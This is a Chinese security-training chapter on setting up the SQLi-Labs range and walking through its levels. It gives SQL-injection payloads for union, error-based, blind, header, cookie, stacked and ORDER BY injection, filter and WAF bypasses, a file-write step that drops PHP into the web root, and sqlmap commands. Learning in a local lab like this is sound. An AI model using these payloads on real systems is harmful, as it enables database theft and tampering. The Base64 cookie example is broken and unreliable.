# 第4章 SQL注入环境SQLi-Labs搭建

## 4.1 SQLi-Labs概述

SQLi-Labs是一个专门用于学习和练习SQL注入的靶场平台，由Audi-1创建并开源在GitHub上。它包含了从基础到高级的各种SQL注入场景，涵盖了几乎所有常见的SQL注入类型和绕过技术，是学习SQL注入的最佳实践环境之一。

### 4.1.1 SQLi-Labs的特点

- **关卡众多**：包含70多个不同难度的SQL注入关卡
- **类型全面**：涵盖GET注入、POST注入、Cookie注入、HTTP头注入等各种类型
- **难度递进**：从基础的联合查询注入到高级的绕过WAF技术
- **源代码开放**：可以查看每个关卡的源代码，理解漏洞原理
- **提示系统**：每个关卡提供提示功能，帮助学习者突破瓶颈
- **社区支持**：拥有大量的学习资源和Writeup

### 4.1.2 适用人群

- SQL注入初学者
- Web安全研究员
- 渗透测试工程师
- CTF参赛选手
- 网络安全学生

### 4.1.3 环境要求

| 组件 | 最低版本要求 |
|-----|-----------|
| 操作系统 | Windows/Linux/macOS |
| Web服务器 | Apache/Nginx |
| PHP | 5.3 及以上（推荐5.x-7.x，不支持PHP 8.x） |
| MySQL | 5.0 及以上（推荐5.5+） |
| 浏览器 | 任意现代浏览器 |

## 4.2 【Windows环境】PHPStudy搭建SQLi-Labs

### 4.2.1 环境准备

Windows环境下推荐使用PHPStudy（小皮面板）搭建SQLi-Labs。

### 4.2.2 下载SQLi-Labs

**操作位置：命令行（PowerShell）**

```powershell
# 方法1：Git克隆
cd E:\phpStudy\WWW
git clone https://github.com/Audi-1/sqli-labs.git

# 方法2：直接下载
# 访问 https://github.com/Audi-1/sqli-labs/releases
# 下载 zip 文件，解压到 E:\phpStudy\WWW\sqli-labs
```

**预期输出（Git克隆）：**
```
Cloning into 'sqli-labs'...
remote: Enumerating objects: 3124, done.
Receiving objects: 100% (3124/3124), 2.50 MiB | 5.00 MiB/s, done.
```

### 4.2.3 配置PHPStudy网站

**操作位置：PHPStudy主界面 -> 网站**

```
1. PHPStudy界面 -> 网站
2. 点击"创建网站"
3. 配置：
   - 域名：sqli.test
   - 端口：81（避免与DVWA的80端口冲突）
   - 网站目录：E:\phpStudy\WWW\sqli-labs
   - PHP版本：7.x（SQLi-Labs需要PHP 5.x-7.x）
4. 点击"确认"
5. 启动服务
```

### 4.2.4 配置数据库连接

**操作位置：文件资源管理器**

```bash
# 进入SQLi-Labs配置目录
cd E:\phpStudy\WWW\sqli-labs\sql-connections

# 编辑 db-creds.inc 文件
notepad db-creds.inc
```

修改数据库连接信息：

```php
$dbuser = 'root';
$dbpass = 'root';  # PHPStudy默认密码是root
$dbname = 'security';
$host = 'localhost';
$port = 3306;
```

> 注意：SQLi-Labs的配置文件是`db-creds.inc`，不是`.php`后缀！

### 4.2.5 创建数据库

**操作位置：浏览器**

```bash
# 访问 http://sqli.test:81/setup-schema.php
# 或 http://127.0.0.1:81/setup-schema.php

# 浏览器会显示数据库创建页面
# 点击 "Setup/Reset Database for labs"
```

**预期输出：**
```
Database security created successfully!
Database challenges created successfully!
```

**如果提示连接错误：**
```
1. 检查MySQL服务是否启动
2. 检查端口是否为3306
3. 检查用户名密码是否正确（默认root/root）
```

### 4.2.6 验证安装

**操作位置：浏览器**

```bash
# 1. 访问 http://sqli.test:81/
#    或 http://127.0.0.1:81/

# 2. 页面应显示SQLi-Labs主页
# 3. 点击 "Less-1" 开始第一关
# 4. URL应为：http://sqli.test:81/Less-1/?id=1
# 5. 如果显示数据库内容，说明安装成功
```

## 4.3 【Linux环境】LAMP搭建SQLi-Labs

### 4.3.1 安装LAMP

**操作位置：终端**

```bash
sudo apt install -y apache2 mysql-server php php-mysql

# 启动服务
sudo systemctl start apache2
sudo systemctl start mysql
sudo systemctl enable apache2
sudo systemctl enable mysql
```

**预期输出：**
```
Setting up apache2 ... Done
Setting up mysql-server ... Done
Setting up php ... Done
```

### 4.3.2 下载SQLi-Labs

**操作位置：终端**

```bash
cd /var/www/html
sudo git clone https://github.com/Audi-1/sqli-labs.git
sudo chmod -R 755 /var/www/html/sqli-labs
sudo chown -R www-data:www-data /var/www/html/sqli-labs
```

**预期输出：**
```
Cloning into '/var/www/html/sqli-labs'...
remote: Enumerating objects: 3124, done.
Receiving objects: 100% (3124/3124), 2.50 MiB | 6.00 MiB/s, done.
```

### 4.3.3 配置数据库

**操作位置：终端**

```bash
sudo nano /var/www/html/sqli-labs/sql-connections/db-creds.inc
```

```php
$dbuser = 'root';
$dbpass = '你的MySQL密码';
$dbname = 'security';
$host = 'localhost';
$port = 3306;
```

### 4.3.4 设置MySQL用户认证

**操作位置：终端**

```bash
# 设置MySQL root密码
sudo mysql -u root << EOF
ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY '你的密码';
FLUSH PRIVILEGES;
EXIT
EOF
```

**预期输出：**
```
Query OK, 0 rows affected
```

### 4.3.5 初始化数据库

**操作位置：浏览器**

```
# 访问setup页面
# 浏览器打开 http://localhost/sqli-labs/setup-schema.php
# 点击 "Setup/Reset Database"
```

**预期输出：**
```
Setup of SQLi-Labs database is complete!
Tables created for Less-1 to Less-65
```

## 4.4 【Docker】方式搭建SQLi-Labs

### 4.4.1 拉取镜像

**操作位置：终端**

```bash
# 搜索SQLi-Labs镜像
docker search sqli-labs

# 拉取镜像
docker pull acgpiano/sqli-labs:latest
```

**预期输出：**
```
NAME                      DESCRIPTION
acgpiano/sqli-labs       SQLI-Labs docker version
...
latest: Pulling from acgpiano/sqli-labs
...
Status: Downloaded newer image for acgpiano/sqli-labs:latest
```

### 4.4.2 运行容器

**操作位置：终端**

```bash
# 运行容器
docker run -d -p 8088:80 --name sqli-labs acgpiano/sqli-labs
```

**预期输出：**
```
1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p
```

### 4.4.3 Docker Compose方式（推荐）

**操作位置：终端**

创建`docker-compose.yml`：

```yaml
version: '3'
services:
  web:
    image: acgpiano/sqli-labs:latest
    container_name: sqli-labs
    ports:
      - "8088:80"
    environment:
      - MYSQL_ROOT_PASSWORD=sqli@2024
    restart: unless-stopped
```

启动服务：

```bash
mkdir sqli-labs && cd sqli-labs
docker-compose up -d
```

**预期输出：**
```
[+] Running 2/2
 ✔ Network sqli-labs_default    Created
 ✔ Container sqli-labs          Started
```

### 4.4.4 访问和初始化

**操作位置：浏览器**

```bash
# 访问 http://localhost:8088/setup-schema.php 创建数据库
# 访问 http://localhost:8088/ 访问主页
```

## 4.5 SQLi-Labs Less分类详解

SQLi-Labs包含70多个关卡，按类型和难度可以分为以下几大类：

### 4.5.1 基础注入系列（Less-1 ~ Less-10）

#### Less-1：GET单引号字符型注入

**类型**：GET - Error based - String - Single quotes

**学习重点**：最基础的SQL注入，单引号闭合

**测试Payload**：
```
?id=1'
?id=1' --+
?id=-1' union select 1,2,3 --+
```

**SQL原理**：原始SQL为 `SELECT * FROM users WHERE id='$id' LIMIT 0,1`

---

#### Less-2：GET整数型注入

**类型**：GET - Error based - Intiger based

**学习重点**：无引号包裹的数字型注入

**测试Payload**：
```
?id=1 and 1=1
?id=-1 union select 1,2,3 --+
```

**SQL原理**：原始SQL为 `SELECT * FROM users WHERE id=$id LIMIT 0,1`

---

#### Less-3：GET单引号括号型注入

**类型**：GET - Error based - String - Single quotes with twist

**学习重点**：单引号+括号闭合

**测试Payload**：
```
?id=1')
?id=-1') union select 1,2,3 --+
```

**SQL原理**：原始SQL为 `SELECT * FROM users WHERE id=('$id') LIMIT 0,1`

---

#### Less-4：GET双引号型注入

**类型**：GET - Error based - String - Double quotes

**学习重点**：双引号+括号闭合

**测试Payload**：
```
?id=1")
?id=-1") union select 1,2,3 --+
```

**SQL原理**：原始SQL为 `SELECT * FROM users WHERE id=("$id") LIMIT 0,1`

---

#### Less-5：GET双查询报错注入

**类型**：GET - Double injection - Single quotes - String

**学习重点**：不能显示数据，利用报错信息获取数据

**测试Payload**：
```
?id=1' and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a) --+
```

**报错函数**：利用`floor()`,`extractvalue()`,`updatexml()`等函数报错

---

#### Less-6：GET双查询双引号报错注入

**类型**：GET - Double injection - Double quotes - String

**学习重点**：双引号下的报错注入

**测试Payload**：
```
?id=1" and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a) --+
```

---

#### Less-7：GET文件导出注入

**类型**：GET - Dump into outfile - String

**学习重点**：利用`INTO OUTFILE`写入文件

**测试Payload**：
```
?id=1')) union select 1,2,'<?php phpinfo();?>' into outfile '/var/www/html/shell.php' --+
```

**前提条件**：
- MySQL有FILE权限
- `secure_file_priv`不为NULL
- 目标目录可写

---

#### Less-8：GET单引号布尔盲注

**类型**：GET - Blind - Boolean based - Single quotes - String

**学习重点**：无回显但有真假判断

**测试Payload**：
```
?id=1' and 1=1 --+
?id=1' and 1=2 --+
?id=1' and length(database())=8 --+
?id=1' and ascii(substr(database(),1,1))=115 --+
```

---

#### Less-9：GET单引号时间盲注

**类型**：GET - Blind - Time based - Single quotes - String

**学习重点**：利用`sleep()`函数延时判断

**测试Payload**：
```
?id=1' and sleep(5) --+
?id=1' and if(length(database())=8,sleep(5),1) --+
```

---

#### Less-10：GET双引号时间盲注

**类型**：GET - Blind - Time based - Double quotes - String

**学习重点**：双引号下的时间盲注

**测试Payload**：
```
?id=1" and sleep(5) --+
?id=1" and if(length(database())=8,sleep(5),1) --+
```

---

### 4.5.2 POST注入系列（Less-11 ~ Less-17）

#### Less-11：POST单引号错误注入

**类型**：POST - Error based - Single quotes - String

**学习重点**：POST参数注入，登录框注入

**测试方法**：使用Burp Suite抓包，修改POST参数

**测试Payload**：
```
uname=admin'-- -&passwd=admin&Submit=Submit
```

**SQL原理**：原始SQL为 `SELECT * FROM users WHERE username='$username' and password='$password' LIMIT 0,1`

---

#### Less-12：POST双引号括号型注入

**类型**：POST - Error based - Double quotes - String - with twist

**学习重点**：双引号+括号闭合的POST注入

**测试Payload**：
```
uname=admin")-- -&passwd=admin&Submit=Submit
```

---

#### Less-13：POST单引号括号双查询注入

**类型**：POST - Double injection - Single quotes - String

**学习重点**：POST型报错注入

**测试Payload**：
```
uname=admin') and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)-- -&passwd=admin&Submit=Submit
```

---

#### Less-14：POST双引号报错注入

**类型**：POST - Double injection - Double quotes - String

**学习重点**：双引号POST报错注入

**测试Payload**：
```
uname=admin" and extractvalue(1,concat(0x7e,database()))-- -&passwd=admin&Submit=Submit
```

---

#### Less-15：POST单引号布尔盲注

**类型**：POST - Blind - Boolean based - String

**学习重点**：POST型布尔盲注

**测试Payload**：
```
uname=admin' and length(database())=8-- -&passwd=admin&Submit=Submit
```

---

#### Less-16：POST双引号括号时间盲注

**类型**：POST - Blind - Time based - String

**学习重点**：POST型时间盲注

**测试Payload**：
```
uname=admin") and sleep(5)-- -&passwd=admin&Submit=Submit
```

---

#### Less-17：POST更新查询报错注入

**类型**：POST - Update Query - Error based

**学习重点**：UPDATE语句注入，`extractvalue()`和`updatexml()`

**测试Payload**：
```
uname=admin&passwd=admin' and extractvalue(1,concat(0x7e,database()))-- -&Submit=Submit
```

---

### 4.5.3 HTTP头注入系列（Less-18 ~ Less-22）

#### Less-18：POST Header注入（Referer）

**类型**：POST - Header Injection - Referer field - Error based

**学习重点**：HTTP头Referer字段注入

**测试方法**：在Referer头注入

**测试Payload**：
```
Referer: ' and updatexml(1,concat(0x7e,database()),1) and '
```

---

#### Less-19：POST Header注入（User-Agent）

**类型**：POST - Header Injection - UserAgent field - Error based

**学习重点**：HTTP头User-Agent字段注入

**测试Payload**：
```
User-Agent: ' and updatexml(1,concat(0x7e,database()),1) and '
```

---

#### Less-20：Cookie注入（Base64编码）

**类型**：POST - Cookie injections - Uagent field - Error based

**学习重点**：Cookie注入，Base64编码

**测试Payload**：
```
Cookie: uname=admin' and updatexml(1,concat(0x7e,database()),1)-- -
```

---

#### Less-21：Cookie Base64编码注入

**类型**：Cookie Injection - Base64 encoded

**学习重点**：Base64编码注入

**测试Payload**：
```
Cookie: uname=admin') and extractvalue(1,concat(0x7e,database()))-- -
# Base64编码后
Cookie: uname=YWimitKcgYW5kIGV4dHJhY3R2YWx1ZSgxLGNvbmNhdCgwNzhlLGRhdGFiYXNlKCkpLDEpKS0tIA==
```

---

#### Less-22：Cookie Base64双引号注入

**类型**：Cookie Injection - Base64 encoded - Double quotes

**学习重点**：Base64编码双引号注入

**测试Payload**：
```
Cookie: uname=admin" and extractvalue(1,concat(0x7e,database()))-- -
# Base64编码后使用
```

---

### 4.5.4 高级注入系列（Less-23 ~ Less-37）

#### Less-23：过滤注释符注入

**类型**：GET - Error based - strip comments

**学习重点**：绕过注释过滤，使用闭合代替注释

**测试Payload**：
```
?id=-1' union select 1,2,3 from users where '1'='1
?id=-1' union select 1,database(),3 from users where '1'='1
```

---

#### Less-24：二次注入

**类型**：Second Degree Injections

**学习重点**：二次注入原理，存储型注入

**攻击流程**：
1. 注册用户：`admin'#`
2. 修改该用户密码
3. 由于拼接SQL时造成注入，修改了admin的密码

---

#### Less-25：过滤OR和AND

**类型**：Trick with OR & AND

**学习重点**：关键字绕过，大小写、双写绕过

**测试Payload**：
```
?id=1' oorr 1=1--+
?id=1' aandnd 1=1--+
?id=1' &&(1=1)--+
?id=1' ||1=1--+
```

---

#### Less-25a：过滤OR和AND盲注

**类型**：Trick with OR & AND - Blind

**学习重点**：过滤关键字的盲注

---

#### Less-26：过滤空格和注释

**类型**：Trick with comments

**学习重点**：空格绕过，注释绕过

**绕过方法**：
```
/**/
/*!*/
%09 %0a %0b %0c %0d %20
```

**测试Payload**：
```
?id=1'%09union%09select%091,2,3--+
?id=1'union%0bselect%0b1,2,3--+
```

---

#### Less-26a：过滤空格盲注

**类型**：Trick with comments - Blind

**学习重点**：空格绕过的盲注

---

#### Less-27：过滤SELECT和UNION

**类型**：Trick with SELECT & UNION

**学习重点**：关键字过滤绕过，大小写、双写绕过

**测试Payload**：
```
?id=1'ununionION%0bselect%091,2,3--+
?id=1'/**/union/**/select/**/1,2,3--+
?id=1'%0bunion%0bselect%0b1,2,3--+
```

---

#### Less-27a：过滤SELECT/UNION盲注

**类型**：Trick with SELECT & UNION - Blind

**学习重点**：过滤关键字的盲注

---

#### Less-28：过滤SELECT/UNION+空格

**类型**：Trick with SELECT & UNION with space

**学习重点**：综合过滤绕过

---

#### Less-28a：过滤SELECT/UNION+空格盲注

**类型**：Trick with SELECT & UNION with space - Blind

---

### 4.5.5 WAF绕过系列（Less-29 ~ Less-37）

#### Less-29：WAF防护绕过（第一层）

**类型**：Protection with WAF - Parameter tampering

**学习重点**：WAF绕过基础，参数污染

**测试Payload**：
```
?id=1&id=2' union select 1,2,3--+
```

---

#### Less-30：WAF防护绕过（第二层）

**类型**：Protection with WAF - Header injection

---

#### Less-31：WAF防护绕过（第三层）

**类型**：Protection with WAF - IDOR

---

### 4.5.6 堆叠查询系列（Less-38 ~ Less-45）

#### Less-38：堆叠查询-字符串

**类型**：Stacked Queries - String

**学习重点**：堆叠查询原理，多语句执行

**测试Payload**：
```
?id=1'; INSERT INTO users(id,username,password) VALUES (100,'hacker','hacker')--+
```

---

#### Less-39：堆叠查询-整数型

**类型**：Stacked Queries - Intiger

**测试Payload**：
```
?id=1; INSERT INTO users(id,username,password) VALUES (101,'hacker2','hacker2')--+
```

---

#### Less-40：堆叠查询-单引号括号型

**类型**：Stacked Queries - String - Blind

---

#### Less-41：堆叠查询-整数型无报错

**类型**：Stacked Queries - Intiger - Blind

---

#### Less-42：POST-堆叠-登录框

**类型**：Post - Stacked - Error string

**学习重点**：POST登录框堆叠注入

**测试Payload**：
```
uname=admin&passwd=admin';insert into users values(200,'test','test')--+
```

---

#### Less-43：POST-堆叠-单引号括号

**类型**：Post - Stacked - Error String with twist

---

#### Less-44：POST-堆叠-盲注字符串

**类型**：Post - Stacked - Blind String

---

#### Less-45：POST-堆叠-盲注单引号括号

**类型**：Post - Stacked - Blind String with twist

---

### 4.5.7 ORDER BY注入系列（Less-46 ~ Less-53）

#### Less-46：ORDER BY注入-数字型

**类型**：ORDER BY Clause - Error based - Intiger

**学习重点**：ORDER BY后的注入点

**测试Payload**：
```
?sort=1 and extractvalue(1,concat(0x7e,database()))
?sort=1procedure analyse(extractvalue(1,concat(0x7e,database())),1)
```

---

#### Less-47：ORDER BY注入-字符型

**类型**：ORDER BY Clause - Error based - String

**测试Payload**：
```
?sort=1' and extractvalue(1,concat(0x7e,database()))--+
```

---

#### Less-48：ORDER BY注入-数字型盲注

**类型**：ORDER BY Clause - Blind - Intiger

**测试Payload**：
```
?sort=1 and length(database())=8
```

---

#### Less-49：ORDER BY注入-字符型盲注

**类型**：ORDER BY Clause - Blind - String

**测试Payload**：
```
?sort=1' and length(database())=8--+
```

---

#### Less-50：ORDER BY注入-数字型堆叠

**类型**：ORDER BY Clause - Stacked injection

---

#### Less-51：ORDER BY注入-字符型堆叠

**类型**：ORDER BY Clause - Stacked injection - String

---

#### Less-52：ORDER BY注入-数字型盲注

**类型**：ORDER BY Clause - Blind - Intiger - No output

---

#### Less-53：ORDER BY注入-字符型盲注

**类型**：ORDER BY Clause - Blind - String - No output

---

### 4.5.8 挑战关卡（Less-54 ~ Less-65）

#### Less-54 ~ Less-65：高级注入挑战

**类型**：Challenges from 1 to 12

**学习重点**：综合运用各种注入技巧

**特点**：
- 每次挑战数据库名、表名、列名随机变化
- 需要多次查询获取正确名称
- 限制查询次数

---

## 4.6 各类型注入学习指南

### 4.6.1 联合查询注入学习路径

**Less-1：入门级单引号字符串注入**

测试步骤：
```
1. 判断注入点：?id=1' 报错
2. 测试闭合：?id=1' --+ 正常
3. 判断字段数：?id=1' ORDER BY 3 --+ 正常，ORDER BY 4报错→3个字段
4. 判断显示位：?id=-1' UNION SELECT 1,2,3 --+
5. 获取数据库：?id=-1' UNION SELECT 1,database(),3 --+
6. 获取表：?id=-1' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema='security'--+
7. 获取列：?id=-1' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--+
8. 获取数据：?id=-1' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users--+
```

### 4.6.2 报错注入学习路径

**Less-5：双查询报错注入**

常用报错函数：
- `updatexml()`
- `extractvalue()`
- `floor()` + `rand()` + `group by`

测试Payload：
```
?id=1' and updatexml(1,concat(0x7e,database(),0x7e),1)--+
?id=1' and extractvalue(1,concat(0x7e,database()))--+
```

### 4.6.3 布尔盲注学习路径

**Less-8：布尔盲注**

布尔盲注需要通过页面返回的不同来判断：
- 页面返回正常 → 条件为真
- 页面返回异常 → 条件为假

测试方法：
```
?id=1' and length(database())=8--+
?id=1' and ascii(substr(database(),1,1))=115--+
```

### 4.6.4 时间盲注学习路径

**Less-9：时间盲注**

时间盲注通过页面响应时间判断：
```
?id=1' and sleep(5)--+
?id=1' and if(length(database())=8,sleep(5),1)--+
```

### 4.6.5 POST注入学习路径

**Less-11：POST单引号注入**

使用Burp Suite抓包，修改POST参数：
```
uname=admin'-- -&passwd=admin&Submit=Submit
```

### 4.6.6 HTTP头注入学习路径

**Less-18：Referer注入**

在HTTP头的Referer字段注入：
```
Referer: ' and updatexml(1,concat(0x7e,database()),1) and '
```

**Less-20：Cookie注入**

在Cookie字段注入：
```
Cookie: uname=admin' and updatexml(1,concat(0x7e,database()),1)-- -
```

### 4.6.7 二次注入学习路径

**Less-24：二次注入**

原理：恶意数据被存储到数据库，当再次被读取时触发注入。

步骤：
1. 注册用户：`admin'#`
2. 修改该用户密码
3. 由于拼接SQL时造成注入，修改了admin的密码

### 4.6.8 堆叠查询学习路径

**Less-38：堆叠查询**

原理：利用分号`;`执行多条SQL语句。

测试Payload：
```
?id=1'; INSERT INTO users(id,username,password) VALUES (100,'hacker','hacker')--+
```

## 4.7 常见问题与排错

### 4.7.1 【Windows环境】常见问题

**问题1：访问首页显示空白**

**操作位置：浏览器 + PHPStudy**

解决步骤：
```
1. 检查Apache/Nginx服务是否启动（PHPStudy界面查看状态）
2. 检查PHP版本是否为5.x或7.x（不支持PHP 8.x）
3. 检查文件权限：确保phpStudy有读取权限
4. 检查PHPStudy网站配置：域名、端口、网站目录是否正确
```

**问题2：点击Setup/Reset Database报错**

解决步骤：
```
1. 检查MySQL服务是否启动
2. 检查db-creds.inc中的数据库配置
3. 确认MySQL root用户密码（默认root）
4. 检查MySQL用户认证方式
```

**问题3：MySQL连接错误Access denied**

解决步骤：
```
1. 打开phpMyAdmin
2. 点击"用户账户"
3. 修改root@localhost的密码
4. 更新db-creds.inc中的密码
```

**问题4：Less系列页面404**

解决步骤：
```
1. 检查URL路径是否正确
2. 检查sql-connections目录下的数据库配置文件
3. 确认setup-schema.php已成功创建数据库
```

### 4.7.2 【Linux环境】常见问题

**问题1：访问页面显示空白**

**操作位置：终端**

解决步骤：
```bash
# 1. 检查Apache状态
sudo systemctl status apache2

# 2. 检查PHP版本（SQLi-Labs不支持PHP 8.x）
php -v

# 3. 检查错误日志
sudo tail -f /var/log/apache2/error.log

# 4. 检查文件权限
sudo chmod -R 755 /var/www/html/sqli-labs/
sudo chown -R www-data:www-data /var/www/html/sqli-labs/
```

**问题2：数据库连接失败**

解决步骤：
```bash
# 1. 检查MySQL状态
sudo systemctl status mysql

# 2. 修改MySQL root认证方式
sudo mysql -u root
ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'your_password';
FLUSH PRIVILEGES;

# 3. 更新配置文件
sudo nano /var/www/html/sqli-labs/sql-connections/db-creds.inc

# 4. 重启MySQL
sudo systemctl restart mysql
```

### 4.7.3 【Docker】常见问题

**问题1：容器启动后访问空白**

**操作位置：终端**

解决步骤：
```bash
# 1. 检查容器状态
docker ps -a

# 2. 查看容器日志
docker logs sqli-labs

# 3. 等待MySQL完全启动（约30秒）
# 4. 重新访问setup页面
```

**问题2：端口已被占用**

解决步骤：
```bash
# 1. 检查端口占用
netstat -an | grep 8088

# 2. 使用其他端口
docker run -d -p 9090:80 --name sqli-labs acgpiano/sqli-labs

# 3. 修改docker-compose.yml中的端口映射
```

**问题3：数据库初始化失败**

解决步骤：
```bash
# 1. 进入容器
docker exec -it sqli-labs /bin/bash

# 2. 手动初始化数据库
cd /var/www/html/sql-connections
php setup-schema.php

# 3. 如果仍失败，检查MySQL状态
docker exec -it sqli-labs mysql -u root -e "SHOW DATABASES;"
```

### 4.7.4 通用问题

**问题1：注入测试没反应**

解决步骤：
```
1. 确认注入点正确
2. 确认闭合方式正确（单引号、双引号、括号等）
3. 使用Burp Suite抓包确认请求
4. 查看源代码确认SQL语句结构
```

**问题2：Less-7文件写入不成功**

解决步骤：
```sql
-- 1. 检查MySQL FILE权限
SHOW GRANTS FOR 'root'@'localhost';

-- 2. 检查secure_file_priv配置
SHOW VARIABLES LIKE 'secure_file_priv';

-- 3. 如果为NULL，修改my.cnf添加
secure_file_priv=''

-- 4. 确保目标目录可写
chmod 777 /var/www/html
```

**问题3：sqlmap检测不到注入**

解决步骤：
```bash
# 1. 确认URL正确，参数存在
sqlmap -u "http://localhost/sqli-labs/Less-1/?id=1"

# 2. 添加--level 3 --risk 3提高测试级别
sqlmap -u "URL" --level 3 --risk 3

# 3. 指定注入参数
sqlmap -u "URL" -p id

# 4. 确认不是POST注入
sqlmap -u "http://localhost/sqli-labs/Less-11/" --data "uname=admin&passwd=admin"
```

## 4.8 本章小结

本章详细介绍了SQL注入专用靶场SQLi-Labs的搭建和使用方法，主要内容包括：

1. **SQLi-Labs概述**：了解靶场特点、适用人群和环境要求
2. **Windows环境搭建**：使用PHPStudy在Windows下完整安装配置SQLi-Labs
3. **Linux环境搭建**：使用LAMP在Linux下完整安装配置SQLi-Labs
4. **Docker部署**：使用Docker快速部署SQLi-Labs环境
5. **Less分类详解**：70多个关卡的详细分类和各关卡学习重点
6. **各类型注入学习**：联合查询、报错注入、盲注、POST注入、HTTP头注入等
7. **常见问题排错**：各环境下安装和使用过程中的常见问题及解决方法

SQLi-Labs是学习SQL注入的最佳实践平台，建议读者从基础关卡（Less-1）开始，循序渐进，每个关卡都先尝试手工注入，理解原理后再使用工具辅助。掌握了SQLi-Labs的所有关卡，你的SQL注入技术将会有质的飞跃。下一章我们将学习另一个经典的Web漏洞靶场BWAPP的搭建。
